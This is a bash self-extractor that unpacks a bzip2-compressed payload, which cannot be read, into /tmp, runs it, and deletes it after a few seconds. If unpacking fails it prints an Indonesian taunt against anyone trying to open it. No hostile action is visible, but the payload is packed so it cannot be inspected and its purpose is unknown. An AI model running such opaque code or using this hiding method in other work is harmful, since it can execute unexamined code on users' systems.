#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SYǐ�� Q_�u������������PD@  � �o���[0� (Q�M2jM6��L����0#�i��!��i�=&�Q��4�M�'��yC�h�CA��    8�h 42h��h �  ��h�hh ��i��� 2�C��h���C!��h� �b ��i12T~I�)��=52z�����$Ѡ4(hz4��(��m>����uS��1,?�Z�˃���J������)Vb_��T���s$�&�:����E��1�@����4�_����z�pc��0�K���b��|EK�S$5��Tށ���ō��ΥC ���Ҷ	\z���	O�Ľ�(���-4�p�Y�Ck�I��r�ʓ�D�Ҋ�n��9)���dŜ��P�K����sF[!vKZ&)�&�Zp��N�>U��Ho�:���IsÂ���k\�E��$贍B��sSklS3����Q%+����0�T�}��)�D`yP6��T������5_iÄ�����1�O���ǰǏ��^>�w� �@�'!��X�KG�G&}V����t�T��B������H�ހK��r@{�w��FO��_#~:y/�N�qs��	qg9a��(bF��1�V�֢�p�31������ KH>"��d�����+��d�H"��z�"�:�d��*��!�8�EQ�x�ـ)���
<nV��L�r��'O<��R��p�׺���ڃ�˖���U��[b"e� 1�:on_7�cX�f4�O�0"ʻ��*�~�>�@�~N]t��Ʌ#���aY����z6��B'��Sf��f�m���
$*R@�s`�����,$2W� �QM����XeU�,��G�F�dd���y#WK���1y^�M#T�$/�G���}"\`Ժ1���wc�xu�X��u-՛y�[��c4c�K¨o'���� 6���#b�!;�`,���wg�Up.�����D1��dE�>dT��(�C`6;OÕ�~�Ku"��ϕB켳��ԫeE�k,ͼ�C $�sZ@7����'M	ۆ�c�@�3$�����5經6>�-��c� g�#�Y��ݶC���ËEtXV!Vj*t�D���A��S;��瞶�XP��#�]�gj�ah�x���jAq�A�f�����f�+��n�S%뷦+ϛ���NfPjZQՔeeh���K%���
G`�DU�ܜ���M�l��ڰ\URX'} 3	)�'$�x(�,�w��:�L��� -�'P�
#����TȀ+YA4�v0�
[��1��gI�0�w���Nr48�� ���*8鸚mtFud���� �m����� �=4*#�D���=3�${��{�i�?�k\5�X�g�g�q�Ȑ� PNp�x(�k��$gi(�n���N�Nv�����Y����5��y�|A��f��%����UV����--F
��%�T�¶%���lOO���7�]B���6_��[���\���ތ�h<�{�ܾ)�#r/e��H��:O�1B�0��LVs7^�s����cn��L���fц�*V.( b_�W0I��/໼�E�/�j 4j���p��D]�w��P��$�x�z�h��bA���W�~6������n*G�}�&$!0�h{C��T� +�1���p��)�<��